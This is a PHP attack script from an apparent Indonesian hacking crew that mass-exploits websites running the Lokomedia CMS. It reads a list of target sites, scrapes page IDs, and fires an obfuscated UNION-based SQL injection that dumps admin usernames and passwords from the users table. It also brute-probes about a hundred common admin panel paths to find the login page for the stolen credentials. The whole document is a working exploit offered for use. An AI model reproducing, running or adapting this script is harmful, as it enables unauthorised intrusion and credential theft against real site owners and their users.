<?php
set_time_limit(0);
error_reporting(0);
 
// Lokomedia (SQL Injection) + Auto Scan Admin Login
// enjoyyyy
// Coded by Mr. Error 404 (l0c4lh34rtz) - IndoXploit - Sanjungan Jiwa
// greetz: res7ock crew - j*ncok Sec
// usage: php namafile.php target.txt
 
//HARAP TIDAK MENGGANTI COPYRIGHT JIKA KALIAN INGIN DIHARGAI ^^
 
function cover() {
    print "[ =========================================================================== ]\n";
    print " --> Lokomedia (SQL Injection) + Auto Scan Admin Login <--\n";
    print " ## Coded by Mr. Error 404 (l0c4lh34rtz) - IndoXploit - Sanjungan Jiwa ##\n";
    print " # greetz: res7ock crew - j*ncok Sec #\n";
    print "+++++++ usage: php namafile.php target.txt +++++++\n";
    print "[ =========================================================================== ]\n\n";
}
function ngcurl($url) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
$admin = array(
'operator/',
'sika/',
'develop/',
'ketua/',
'redaktur/',
'author',
'admin/',
'administrator/',
'adminweb/',
'user/',
'users/',
'dinkesadmin/',
'retel/',
'author/',
'panel/',
'paneladmin/',
'panellogin/',
'redaksi/',
'cp-admin/',
'master/',
'master/index.php',
'master/login.php',
'operator/index.php',
'sika/index.php',
'develop/index.php',
'ketua/index.php',
'redaktur/index.php',
'admin/index.php',
'administrator/index.php',
'adminweb/index.php',
'user/index.php',
'users/index.php',
'dinkesadmin/index.php',
'retel/index.php',
'author/index.php',
'panel/index.php',
'paneladmin/index.php',
'panellogin/index.php',
'redaksi/index.php',
'cp-admin/index.php',
'operator/login.php',
'sika/login.php',
'develop/login.php',
'ketua/login.php',
'redaktur/login.php',
'admin/login.php',
'administrator/login.php',
'adminweb/login.php',
'user/login.php',
'users/login.php',
'dinkesadmin/login.php',
'retel/login.php',
'author/login.php',
'panel/login.php',
'paneladmin/login.php',
'panellogin/login.php',
'redaksi/login.php',
'cp-admin/login.php',
'terasadmin/',
'terasadmin/index.php',
'terasadmin/login.php',
'rahasia/',
'rahasia/index.php',
'rahasia/admin.php',
'rahasia/login.php',
'dinkesadmin/',
'dinkesadmin/login.php',
'adminpmb/',
'adminpmb/index.php',
'adminpmb/login.php',
'system/',
'system/index.php',
'system/login.php',
'webadmin/',
'webadmin/index.php',
'webadmin/login.php',
'wpanel/',
'wpanel/index.php',
'wpanel/login.php',
'adminpanel/index.php',
'adminpanel/',
'adminpanel/login.php',
'adminkec/',
'adminkec/index.php',
'adminkec/login.php',
'admindesa/',
'admindesa/index.php',
'admindesa/login.php',
'adminkota/',
'adminkota/index.php',
'adminkota/login.php',
'admin123/',
'admin123/index.php',
'admin123/login.php',
'logout/',
'logout/index.php',
'logout/login.php',
'logout/admin.php',
);
 
$sites = explode("\n", file_get_contents($argv[1]));
if(isset($argv[1])) {
    cover();
    foreach($sites as $url) {
        if(!preg_match("/^http:\/\//", $url) AND !preg_match("/^https:\/\//", $url)) {
            $url = "http://$url";
        } else {
            $url = $url;
        }
        $statis = "";
        $sisa = "";
        $login = "";
        $curl = ngcurl($url);
        preg_match_all("/<a href='statis-(.*?)'>/", $curl, $id);
        foreach($id[1] as $stat) {
            $pecah = explode("-", $stat);
            $statis .= $pecah[0];
            $sisa .= $pecah[1];
            break;
        }
        foreach($admin as $adminweb) {
            $curl_admin = ngcurl("$url/$adminweb");
            if(preg_match("/administrator|username|password|admin/i", $curl_admin) AND !preg_match("/not found|forbidden|404|403/i", $curl_admin)) {
                $login .= "$url/$adminweb";
                break;
            }
        }
        $sql = ngcurl("$url/statis-$statis'/*!50000UnIon*/+/*!50000SeleCT+/*!50000ConCAT*/(username,0x20,password)+FROM+users--+--+$sisa");
        preg_match("/<title>(.*?)<\/title>/", $sql, $up);
        $akun = explode(" ", $up[1]);
        print "[+] URL: $url\n";
        if(htmlspecialchars($curl) !== htmlspecialchars($sql)) {
            if(preg_match("/admin|admin123|administrator/", $akun[0])) {
                print "[+] Injection Successfully!\n";
                print "[+] username: ".$akun[0]."\n";
                print "[+] password: ".$akun[1]."\n";
                if($login == "") {
                    print "[+] Login Admin ga ketemu :(\n\n";
                } else {
                    print "[+] Login: $login\n\n";
                }
            } else {
                print "[+] Not Injected :(\n\n";
            }
        } else {
            print "[+] Not Injected :(\n\n";
        }
    }
} else {
    print "usage: php ".$argv[0]." target.txt\n";
}
?>